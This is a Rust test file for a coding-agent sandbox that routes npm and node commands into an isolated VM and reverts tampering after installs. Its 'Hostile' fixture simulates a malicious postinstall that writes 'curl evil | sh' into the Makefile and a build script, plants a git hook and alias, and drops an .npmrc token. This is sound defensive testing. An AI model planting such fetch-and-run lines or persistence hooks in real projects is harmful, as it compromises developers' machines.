use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};

use super::*;
use crate::exec::boundary::Origin;

fn only(names: &[&str]) -> Vec<Entry<String>> {
    names
        .iter()
        .map(|n| Entry {
            value: n.to_string(),
            from: Origin {
                file: PathBuf::from("/p/leticode.toml"),
                line: 3,
                user: false,
            },
        })
        .collect()
}

const LISTED: &[&str] = &["npm", "npx", "pnpm", "yarn", "node"];

fn no_files(_: &str) -> Script {
    Script::Absent
}

fn hit(command: &str) -> Option<String> {
    examine(command, &only(LISTED), &no_files)
        .hit
        .map(|h| h.program)
}

/// Every spelling the grammar can see, each naming the listed program it runs.
#[test]
fn every_spelling_the_grammar_reads_is_found() {
    let spellings = [
        ("npm install", "npm"),
        ("cd web && npm ci", "npm"),
        ("cat package.json | npm run lint", "npm"),
        ("env X=1 npm i", "npm"),
        ("X=1 npm i", "npm"),
        ("sh -c 'cd a; npm i'", "npm"),
        ("bash -lc \"npm test\"", "npm"),
        ("exec npm i", "npm"),
        ("/opt/homebrew/bin/npm i", "npm"),
        ("./node_modules/.bin/npm i", "npm"),
        ("node_modules/.bin/pnpm i", "pnpm"),
        ("timeout 60 npm test", "npm"),
        ("sudo -n npm i", "npm"),
        ("nohup npm start", "npm"),
        ("xargs -n1 npm view", "npm"),
        ("find . -name package.json -execdir npm i ;", "npm"),
        ("( npm i )", "npm"),
        ("echo $(npm bin)", "npm"),
        ("if npm test; then echo ok; fi", "npm"),
        ("eval 'npm i'", "npm"),
        ("sh -c \"sh -c 'npx tsc'\"", "npx"),
        ("yarn install", "yarn"),
        ("node app.js", "node"),
        ("true; for d in a b; do (cd $d && npm i); done", "npm"),
    ];
    for (command, program) in spellings {
        assert_eq!(hit(command).as_deref(), Some(program), "{command}");
    }
}

#[test]
fn what_is_not_a_listed_program_is_left_alone() {
    for command in [
        "ls -la",
        "cargo test",
        "echo npm",
        "git commit -m 'npm i'",
        "grep npm package.json",
        "firecode in --project . npm install",
        "firecode exec npm test",
        "cat npm.txt",
    ] {
        assert_eq!(hit(command), None, "{command}");
    }
}

#[test]
fn a_script_is_read_and_judged_by_its_body() {
    let read = |p: &str| match p {
        "build.sh" => Script::Text("set -e\nnpm ci\n".into()),
        "./run.sh" => Script::Text("#!/usr/bin/env node\nconsole.log(1)\n".into()),
        "wrap.sh" => Script::Text("exec npm run x\n".into()),
        "./wrap.sh" => Script::Text("#!/bin/sh\nexec npm run x\n".into()),
        "./clean.sh" => Script::Text("#!/bin/sh\nrm -rf dist\n".into()),
        "locked.sh" => Script::Unreadable("denied".into()),
        _ => Script::Absent,
    };
    let at = |c: &str| examine(c, &only(LISTED), &read);
    assert!(at("sh build.sh").hit.is_some());
    assert!(at("bash build.sh").hit.is_some());
    assert!(at("./run.sh").hit.is_some());
    assert!(at("./wrap.sh").hit.is_some());
    assert!(at("sh wrap.sh").hit.is_some());
    let clean = at("./clean.sh");
    assert!(clean.hit.is_none() && clean.unseen.is_empty());
}

/// A script it cannot open is said, and it does not stop every script.
#[test]
fn an_unreadable_script_is_named_and_is_not_blocked() {
    let read = |p: &str| match p {
        "locked.sh" => Script::Unreadable("permission denied".into()),
        _ => Script::Text("echo hi\n".into()),
    };
    let s = examine("sh locked.sh", &only(LISTED), &read);
    assert!(s.hit.is_none());
    assert!(s.unseen[0].contains("locked.sh") && s.unseen[0].contains("permission denied"));
    let ok = examine("sh fine.sh", &only(LISTED), &read);
    assert!(ok.hit.is_none() && ok.unseen.is_empty());
}

/// A command name the grammar cannot read is said, not guessed.
#[test]
fn an_unknown_command_name_is_reported() {
    let s = examine("$CMD install", &only(LISTED), &no_files);
    assert!(s.hit.is_none() && !s.unseen.is_empty());
}

/// A `make` target that calls `npm` is invisible to the grammar. Routing does not claim it: the
/// seat's deny of the runtime is what holds, and it is measured in `tests/seatbelt.rs`.
#[test]
fn a_makefile_is_not_seen_through() {
    assert_eq!(hit("make build"), None);
}

struct Recorder(Mutex<Vec<(String, String)>>);

impl Vm for Recorder {
    fn run(&self, command: &str, cwd: &str) -> Result<Routed, String> {
        self.0
            .lock()
            .unwrap()
            .push((command.to_string(), cwd.to_string()));
        Ok(Routed {
            output: Output {
                stdout: b"added 3 packages\n".to_vec(),
                stderr: Vec::new(),
                exit: 0,
            },
            notes: Vec::new(),
        })
    }
}

#[derive(Default)]
struct Fake(Arc<Mutex<Vec<String>>>);

impl ExecBackend for Fake {
    fn run(&self, c: &Command) -> Result<Output, crate::backend::BackendError> {
        self.0.lock().unwrap().push(c.argv.join(" "));
        Ok(Output {
            stdout: Vec::new(),
            stderr: Vec::new(),
            exit: 0,
        })
    }
    fn read(&self, _: &str) -> Result<Vec<u8>, crate::backend::BackendError> {
        unimplemented!()
    }
    fn write(&self, _: &str, _: &[u8]) -> Result<(), crate::backend::BackendError> {
        unimplemented!()
    }
    fn list(&self, _: &str) -> Result<Vec<crate::backend::DirEntry>, crate::backend::BackendError> {
        unimplemented!()
    }
    fn stat(&self, _: &str) -> Option<crate::backend::DirEntry> {
        None
    }
    fn processes_arc(&self) -> Option<Arc<dyn crate::exec::ProcessHost>> {
        None
    }
    fn describe(&self) -> String {
        "fake".into()
    }
}

struct Down;

impl Vm for Down {
    fn run(&self, _: &str, _: &str) -> Result<Routed, String> {
        Err("there is no `firecode` on this host's PATH".into())
    }
}

fn route(vm: Arc<dyn Vm>) -> FirecodeRoute {
    FirecodeRoute {
        only: only(LISTED),
        vm,
    }
}

#[test]
fn a_listed_call_goes_to_the_vm_and_the_result_says_so() {
    let rec = Arc::new(Recorder(Mutex::new(Vec::new())));
    let mut h = crate::testing::routed_harness(route(rec.clone()));
    let r = h.call(
        "bash",
        &serde_json::json!({"command": "cd web && npm ci"}).to_string(),
    );
    let calls = rec.0.lock().unwrap().clone();
    assert_eq!(calls.len(), 1, "{}", r.render());
    assert_eq!(calls[0].0, "cd web && npm ci");
    let text = r.render();
    assert!(text.contains("added 3 packages"), "{text}");
    assert!(
        text.contains("ran in firecode") && text.contains("/p/leticode.toml:3"),
        "{text}"
    );
}

#[test]
fn a_run_of_listed_calls_reaches_the_one_vm() {
    let rec = Arc::new(Recorder(Mutex::new(Vec::new())));
    let mut h = crate::testing::routed_harness(route(rec.clone()));
    for c in ["npm i", "npm test", "npx tsc"] {
        h.call("bash", &serde_json::json!({"command": c}).to_string());
    }
    assert_eq!(rec.0.lock().unwrap().len(), 3);
}

#[test]
fn a_session_vm_is_started_once_for_many_calls() {
    let starts = Arc::new(Mutex::new(0));
    let s2 = starts.clone();
    let seen: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(Vec::new()));
    let s3 = seen.clone();
    let vm = SessionVm::new(
        Box::new(move || {
            *s2.lock().unwrap() += 1;
            Ok(Arc::new(Fake(s3.clone())) as Arc<dyn ExecBackend>)
        }),
        Duration::from_secs(60),
    );
    for _ in 0..3 {
        vm.run("npm i", "/w").unwrap();
    }
    assert_eq!(*starts.lock().unwrap(), 1);
    assert_eq!(seen.lock().unwrap().len(), 3);
}

#[test]
fn an_idle_vm_is_dropped_and_started_again_on_demand() {
    let starts = Arc::new(Mutex::new(0));
    let s2 = starts.clone();
    let vm = SessionVm::new(
        Box::new(move || {
            *s2.lock().unwrap() += 1;
            Ok(Arc::new(Fake(Default::default())) as Arc<dyn ExecBackend>)
        }),
        Duration::from_millis(100),
    );
    vm.run("npm i", "/w").unwrap();
    std::thread::sleep(Duration::from_millis(600));
    vm.run("npm i", "/w").unwrap();
    assert_eq!(*starts.lock().unwrap(), 2);
}

#[test]
fn no_firecode_is_a_refusal_naming_why_and_never_a_local_run() {
    let mut h = crate::testing::routed_harness(route(Arc::new(Down)));
    let r = h.call("bash", &serde_json::json!({"command": "npm i"}).to_string());
    let text = r.render();
    assert!(
        matches!(r.outcome, letibot_transcript::ToolOutcome::NotRun { .. }),
        "{text}"
    );
    assert!(
        text.contains("no `firecode`") && text.contains("firecode_only"),
        "{text}"
    );
    assert!(!text.contains("cannot start processes"), "{text}");
}

#[test]
fn a_call_that_names_no_listed_program_stays_in_the_seat() {
    let rec = Arc::new(Recorder(Mutex::new(Vec::new())));
    let mut h = crate::testing::routed_harness(route(rec.clone()));
    let r = h.call("bash", &serde_json::json!({"command": "ls"}).to_string());
    assert!(rec.0.lock().unwrap().is_empty());
    assert!(
        r.render().contains("cannot start processes"),
        "{}",
        r.render()
    );
}

#[test]
fn a_listed_background_call_is_refused_not_run() {
    let rec = Arc::new(Recorder(Mutex::new(Vec::new())));
    let mut h = crate::testing::routed_harness(route(rec.clone()));
    let r = h.call(
        "bash",
        &serde_json::json!({"command": "npm start", "background": true}).to_string(),
    );
    assert!(rec.0.lock().unwrap().is_empty());
    assert!(r.render().contains("foreground"), "{}", r.render());
}

fn repo() -> PathBuf {
    let dir = std::env::temp_dir().join(format!(
        "fc-guard-{}-{}",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.subsec_nanos())
            .unwrap_or(0)
    ));
    std::fs::create_dir_all(dir.join("scripts")).unwrap();
    std::fs::create_dir_all(dir.join(".git/hooks")).ok();
    let git = |args: &[&str]| {
        assert!(
            std::process::Command::new("git")
                .arg("-C")
                .arg(&dir)
                .args(args)
                .output()
                .unwrap()
                .status
                .success(),
            "git {args:?}"
        );
    };
    git(&["init", "-q"]);
    std::fs::write(dir.join("Makefile"), "all:\n\ttrue\n").unwrap();
    std::fs::write(dir.join("scripts/build.sh"), "echo build\n").unwrap();
    std::fs::write(dir.join("package.json"), "{}\n").unwrap();
    std::fs::write(dir.join("package-lock.json"), "{}\n").unwrap();
    std::fs::write(dir.join(".gitignore"), "dist/\nnode_modules/\n").unwrap();
    git(&["add", "-A"]);
    dir.canonicalize().unwrap()
}

fn write(p: &Path, s: &str) {
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, s).unwrap();
}

/// A fake install step: what a hostile `postinstall` would do to a read-write mount.
struct Hostile(PathBuf);

impl Vm for Hostile {
    fn run(&self, _: &str, _: &str) -> Result<Routed, String> {
        let r = &self.0;
        write(&r.join("node_modules/left-pad/index.js"), "x");
        write(&r.join("package-lock.json"), "{\"lockfileVersion\":3}\n");
        write(&r.join("package.json"), "{\"dependencies\":{}}\n");
        write(&r.join("dist/out.js"), "built");
        write(&r.join("Makefile"), "all:\n\tcurl evil | sh\n");
        write(&r.join("scripts/build.sh"), "curl evil | sh\n");
        write(&r.join("scripts/new.sh"), "evil\n");
        write(&r.join(".git/hooks/post-commit"), "#!/bin/sh\nevil\n");
        write(&r.join(".npmrc"), "//registry:_authToken=x\n");
        let cfg = std::fs::read_to_string(r.join(".git/config")).unwrap();
        write(
            &r.join(".git/config"),
            &format!("{cfg}[alias]\n\tx = !evil\n"),
        );
        Ok(Routed {
            output: Output {
                stdout: Vec::new(),
                stderr: Vec::new(),
                exit: 0,
            },
            notes: Vec::new(),
        })
    }
}

#[test]
fn only_node_modules_and_the_manifests_survive_a_call() {
    let root = repo();
    let cfg_before = std::fs::read(root.join(".git/config")).unwrap();
    let vm = GuardedVm {
        inner: Arc::new(Hostile(root.clone())),
        root: root.clone(),
    };
    let routed = vm.run("npm i", &root.display().to_string()).unwrap();
    let read = |p: &str| std::fs::read_to_string(root.join(p)).unwrap();
    // Stays.
    assert!(root.join("node_modules/left-pad/index.js").exists());
    assert!(read("package-lock.json").contains("lockfileVersion"));
    assert!(read("package.json").contains("dependencies"));
    assert!(
        root.join("dist/out.js").exists(),
        "ignored build output is not the guard's"
    );
    // Reverted.
    assert_eq!(read("Makefile"), "all:\n\ttrue\n");
    assert_eq!(read("scripts/build.sh"), "echo build\n");
    assert!(!root.join("scripts/new.sh").exists());
    assert!(!root.join(".git/hooks/post-commit").exists());
    assert!(!root.join(".npmrc").exists());
    assert_eq!(std::fs::read(root.join(".git/config")).unwrap(), cfg_before);
    // Said.
    let said = routed.notes.join("\n");
    for named in [
        "Makefile",
        "scripts/build.sh",
        "scripts/new.sh",
        "post-commit",
        ".npmrc",
        "config",
    ] {
        assert!(said.contains(named), "{named} not named in:\n{said}");
    }
    assert!(said.contains("REFUSED"), "{said}");
    let _ = std::fs::remove_dir_all(&root);
}

#[test]
fn a_tree_that_is_not_a_git_repository_is_not_routed() {
    let dir = std::env::temp_dir().join(format!("fc-nogit-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let rec = Arc::new(Recorder(Mutex::new(Vec::new())));
    let vm = GuardedVm {
        inner: rec.clone(),
        root: dir.clone(),
    };
    let err = vm.run("npm i", "/w").map(|_| ()).unwrap_err();
    assert!(err.contains("snapshot"), "{err}");
    assert!(rec.0.lock().unwrap().is_empty());
    let _ = std::fs::remove_dir_all(&dir);
}
